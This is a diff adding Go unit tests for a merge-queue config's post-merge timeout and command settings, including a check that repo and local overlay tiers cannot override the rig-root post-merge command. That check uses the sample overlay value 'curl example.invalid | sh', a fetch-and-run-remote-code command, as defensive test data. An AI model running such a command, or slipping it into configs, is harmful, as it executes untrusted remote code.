@@ -6692,3 +6692,88 @@ func TestBuildStartupCommand_PlainPathReturnsCommandWhenEnvSet(t *testing.T) {
 		t.Errorf("startup command does not export the resolved key: %q", cmd)
 	}
 }
+
+func TestMergeQueueConfig_GetPostMergeTimeout(t *testing.T) {
+	t.Parallel()
+
+	var nilCfg *MergeQueueConfig
+	if got := nilCfg.GetPostMergeTimeout(); got != DefaultPostMergeTimeout {
+		t.Errorf("nil config: GetPostMergeTimeout() = %v, want %v", got, DefaultPostMergeTimeout)
+	}
+	cases := []struct {
+		in   string
+		want time.Duration
+	}{
+		{"", DefaultPostMergeTimeout},
+		{"90s", 90 * time.Second},
+		{"garbage", DefaultPostMergeTimeout},
+		{"-5m", DefaultPostMergeTimeout},
+	}
+	for _, tc := range cases {
+		c := &MergeQueueConfig{PostMergeTimeout: tc.in}
+		if got := c.GetPostMergeTimeout(); got != tc.want {
+			t.Errorf("GetPostMergeTimeout(%q) = %v, want %v", tc.in, got, tc.want)
+		}
+	}
+	if DefaultPostMergeTimeout != 20*time.Minute {
+		t.Errorf("DefaultPostMergeTimeout = %v, want 20m (covers the 5m install lock wait plus a cold build)", DefaultPostMergeTimeout)
+	}
+}
+
+func TestMergeQueueConfig_PostMergeJSON(t *testing.T) {
+	t.Parallel()
+
+	var c MergeQueueConfig
+	if err := json.Unmarshal([]byte(`{"post_merge_command":"scripts/install-after-merge.sh","post_merge_timeout":"15m"}`), &c); err != nil {
+		t.Fatalf("unmarshal: %v", err)
+	}
+	if c.PostMergeCommand != "scripts/install-after-merge.sh" || c.PostMergeTimeout != "15m" {
+		t.Fatalf("got command=%q timeout=%q", c.PostMergeCommand, c.PostMergeTimeout)
+	}
+	out, err := json.Marshal(&MergeQueueConfig{})
+	if err != nil {
+		t.Fatalf("marshal: %v", err)
+	}
+	if strings.Contains(string(out), "post_merge") {
+		t.Errorf("empty config marshals post_merge fields: %s", out)
+	}
+}
+
+func TestValidateMergeQueueConfig_PostMergeTimeout(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		in      string
+		wantErr bool
+	}{
+		{"", false},
+		{"20m", false},
+		{"nope", true},
+		{"0s", true},
+		{"-1m", true},
+	}
+	for _, tc := range cases {
+		err := validateMergeQueueConfig(&MergeQueueConfig{PostMergeTimeout: tc.in})
+		if (err != nil) != tc.wantErr {
+			t.Errorf("post_merge_timeout=%q: err=%v, wantErr=%v", tc.in, err, tc.wantErr)
+		}
+	}
+}
+
+// post_merge_command is honored only from the rig-root tier: the repo and
+// local tiers must not be able to set or replace it.
+func TestMergeSettingsCommand_PostMergeCommandRigRootOnly(t *testing.T) {
+	t.Parallel()
+
+	rigRoot := &MergeQueueConfig{PostMergeCommand: "scripts/install-after-merge.sh", PostMergeTimeout: "15m"}
+	overlay := &MergeQueueConfig{PostMergeCommand: "curl example.invalid | sh", PostMergeTimeout: "1s"}
+
+	got := MergeSettingsCommand(rigRoot, overlay)
+	if got.PostMergeCommand != "scripts/install-after-merge.sh" || got.PostMergeTimeout != "15m" {
+		t.Fatalf("overlay replaced rig-root post-merge settings: command=%q timeout=%q", got.PostMergeCommand, got.PostMergeTimeout)
+	}
+	got = MergeSettingsCommand(nil, overlay)
+	if got.PostMergeCommand != "" || got.PostMergeTimeout != "" {
+		t.Fatalf("overlay-only tier set post-merge settings: command=%q timeout=%q", got.PostMergeCommand, got.PostMergeTimeout)
+	}
+}
